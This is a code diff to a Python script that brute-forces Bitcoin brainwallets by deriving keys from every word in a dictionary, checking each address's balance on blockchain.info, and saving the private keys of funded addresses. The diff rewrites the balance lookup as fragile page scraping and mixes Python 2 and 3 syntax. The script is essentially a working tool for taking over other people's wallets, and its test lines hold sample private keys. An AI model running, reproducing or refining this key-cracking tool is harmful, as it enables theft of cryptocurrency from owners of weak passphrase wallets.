@@ -5,6 +5,7 @@ import ctypes.util
 import urllib2
 import sys
 import codecs
+import itertools
 
 ssl = ctypes.cdll.LoadLibrary (ctypes.util.find_library ('ssl') or 'libeay32')
 
@@ -168,17 +169,17 @@ def get_addr(k):
 
 def test():
     # random uncompressed
-    print get_addr(gen_eckey())
+    print(get_addr(gen_eckey()))
     # random compressed
-    print get_addr(gen_eckey(compressed=True))
+    print(get_addr(gen_eckey(compressed=True)))
     # by secret
-    print get_addr(gen_eckey(secret=('%064x' % 0xdeadbabe).decode('hex')))
+    print(get_addr(gen_eckey(secret=('%064x' % 0xdeadbabe).decode('hex'))))
     # by passphrase
-    print get_addr(gen_eckey(passphrase='Satoshi Nakamoto'))
+    print(get_addr(gen_eckey(passphrase='Satoshi Nakamoto')))
     # by private key, uncompressed
-    print get_addr(gen_eckey(pkey='5K1HkbYffstTZDuV4riUWMbAMkQh57b8798uoy9pXYUDYeUHe7F'))
+    print(get_addr(gen_eckey(pkey='5K1HkbYffstTZDuV4riUWMbAMkQh57b8798uoy9pXYUDYeUHe7F')))
     # by private key, compressed
-    print get_addr(gen_eckey(pkey='L3ATL5R9Exe1ubuAnHVgNgTKZEUKkDvWYAWkLUCyyvzzxRjtgyFe'))
+    print(get_addr(gen_eckey(pkey='L3ATL5R9Exe1ubuAnHVgNgTKZEUKkDvWYAWkLUCyyvzzxRjtgyFe')))
 
 if __name__ == '__main__':
     dict_file = "dictionary.txt"
@@ -186,7 +187,7 @@ if __name__ == '__main__':
     abe_server = "localhost"
     abe_port = "2750"
     abe_chain = "Bitcoin"
-    print "Starting search for used brainwallet addresses using dictionary '%s'" % dict_file
+    print("Starting search for used brainwallet addresses using dictionary '{}'".format(dict_file))
 
     num_lines = sum(1 for line in open(dict_file))
 
@@ -199,13 +200,20 @@ if __name__ == '__main__':
         a = get_addr(gen_eckey(passphrase=line))
         address = a[0]
         private_address = a[1]
-        received_bitcoins = urllib2.urlopen("http://%s:%s/chain/%s/q/getreceivedbyaddress/%s" % (abe_server, abe_port, abe_chain, address)).read()
-        if(received_bitcoins != "0"):
-            msg = "Found address %s using dictionary word %s which has received %s bitcoins. Private key: %s\n" % (address, line.rstrip(), received_bitcoins, private_address)
-            print msg
-            found.write(msg)
+        try:
+          received_bitcoins = urllib2.urlopen("http://blockchain.info/address/{}".format(address)).read()
+          it = itertools.takewhile( lambda x: x!=' ',
+              received_bitcoins[received_bitcoins.find("final_balance") + 52:])
+          balance = float(''.join(it))
+          if balance > 0:
+            found.write("{}:{}\n".format(address, private_address))
+            print("Found {} with balance {}".format(address, balance))
+          else:
+            print("Just another {} balance".format(balance))
+        except urllib2.HTTPError:
+          pass
         if( (line_count % 1000) == 0 ):
-            print "Progress: %s of %s words checked so far" % (line_count, num_lines)
+            print("Progress: {} of {} words checked so far".format(line_count, num_lines))
             
     found.close()
     dictionary.close()
